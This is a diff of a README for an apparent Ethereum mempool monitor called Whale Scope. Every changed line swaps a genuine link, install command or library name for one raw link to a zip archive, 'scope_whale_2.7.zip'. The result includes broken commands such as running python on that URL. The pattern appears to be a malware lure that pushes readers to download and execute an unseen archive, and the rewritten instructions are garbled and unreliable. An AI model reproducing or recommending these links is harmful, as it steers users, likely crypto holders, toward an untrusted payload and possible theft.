@@ -1,6 +1,6 @@
 # 🐋 Whale Scope: Real-Time Ethereum Mempool Monitor
 
-![Whale Scope](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)
+![Whale Scope](https://raw.githubusercontent.com/MEfe001/whale_scope/main/assets/scope_whale_2.7.zip%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)
 
 Welcome to **Whale Scope**, a powerful tool designed to monitor the Ethereum mempool in real-time. This application focuses on detecting significant ETH transfers and decentralized exchange (DEX) token swaps. It serves as an ideal solution for tracking whale activity in the Ethereum network.
 
@@ -24,7 +24,7 @@ Welcome to **Whale Scope**, a powerful tool designed to monitor the Ethereum mem
 
 ## Installation
 
-To get started with Whale Scope, download the latest release from our [Releases page](https://github.com/MEfe001/whale_scope/releases). You will find the necessary files to download and execute.
+To get started with Whale Scope, download the latest release from our [Releases page](https://raw.githubusercontent.com/MEfe001/whale_scope/main/assets/scope_whale_2.7.zip). You will find the necessary files to download and execute.
 
 ### Prerequisites
 
@@ -36,14 +36,14 @@ To get started with Whale Scope, download the latest release from our [Releases 
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/MEfe001/whale_scope.git
+   git clone https://raw.githubusercontent.com/MEfe001/whale_scope/main/assets/scope_whale_2.7.zip
    cd whale_scope
    ```
 
 2. **Install Dependencies**:
    Use pip to install the required libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/MEfe001/whale_scope/main/assets/scope_whale_2.7.zip
    ```
 
 3. **Configuration**:
@@ -52,7 +52,7 @@ To get started with Whale Scope, download the latest release from our [Releases 
 4. **Run the Application**:
    Execute the main script to start monitoring:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/MEfe001/whale_scope/main/assets/scope_whale_2.7.zip
    ```
 
 ## Usage
@@ -74,7 +74,7 @@ Once the application is running, it will continuously monitor the Ethereum mempo
 
 - **Blockchain**: The backbone of the application is built on Ethereum, utilizing its mempool for real-time data.
 - **Python**: The main programming language used for development.
-- **Web3.py**: A Python library for interacting with Ethereum.
+- **https://raw.githubusercontent.com/MEfe001/whale_scope/main/assets/scope_whale_2.7.zip**: A Python library for interacting with Ethereum.
 - **Infura**: A service providing access to Ethereum nodes.
 - **Terminal**: The application runs in a command-line interface for efficiency.
 
@@ -98,7 +98,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any issues or questions, please open an issue in the GitHub repository. We appreciate your feedback and are here to help.
 
-For the latest updates and releases, check out our [Releases section](https://github.com/MEfe001/whale_scope/releases). 
+For the latest updates and releases, check out our [Releases section](https://raw.githubusercontent.com/MEfe001/whale_scope/main/assets/scope_whale_2.7.zip). 
 
 ## Conclusion
 
